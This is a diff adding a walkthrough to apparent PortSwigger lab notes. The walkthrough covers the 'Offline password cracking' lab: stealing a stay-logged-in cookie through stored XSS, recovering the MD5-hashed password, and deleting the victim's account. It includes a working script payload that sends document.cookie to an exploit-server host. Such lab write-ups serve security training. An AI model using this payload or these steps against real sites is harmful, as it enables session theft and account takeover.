@@ -12,6 +12,7 @@
 - [2FA simple bypass](#2fa-simple-bypass)
 - [2FA broken logic](#2fa-broken-logic)
 - [Brute-forcing a stay-logged-in cookie](#brute-forcing-a-stay-logged-in-cookie)
+- [Offline password cracking](#offline-password-cracking)
 
 ## Username enumeration via different responses
 Reference: https://portswigger.net/web-security/authentication/password-based/lab-username-enumeration-via-different-responses
@@ -177,3 +178,26 @@ base64(username+':'+md5HashOfPassword)
 - Change the Add prefix rule to add ``carlos:`` instead of ``wiener:``.
 10. When the attack is finished, the lab will be solved. Notice that only one request returned a response containing ``Update email``. The payload from this request is the valid ``stay-logged-in`` cookie for Carlos's account.
 
+## Offline password cracking
+Reference: https://portswigger.net/web-security/authentication/other-mechanisms/lab-offline-password-cracking
+
+<!-- omit in toc -->
+### Solution
+1. With Burp running, use your own account to investigate the "Stay logged in" functionality. Notice that the ``stay-logged-in`` cookie is Base64 encoded.
+2. In the Proxy > HTTP history tab, go to the Response to your login request and highlight the ``stay-logged-in`` cookie, to see that it is constructed as follows:
+```
+username+':'+md5HashOfPassword
+```
+3. You now need to steal the victim user's cookie. Observe that the comment functionality is vulnerable to XSS.
+4. Go to the exploit server and make a note of the URL.
+5. Go to one of the blogs and post a comment containing the following stored XSS payload, remembering to enter your own exploit server ID:
+```
+<script>document.location='//your-exploit-server-id.web-security-academy.net/'+document.cookie</script>
+```
+6. On the exploit server, open the access log. There should be a GET request from the victim containing their ``stay-logged-in`` cookie.
+7. Decode the cookie in Burp Decoder. The result will be:
+```
+carlos:26323c16d5f4dabff3bb136f2460a943
+```
+8. Copy the hash and paste it into a search engine. This will reveal that the password is ``onceuponatime``.
+9. Log in to the victim's account, go to the "My account" page, and delete their account to solve the lab.
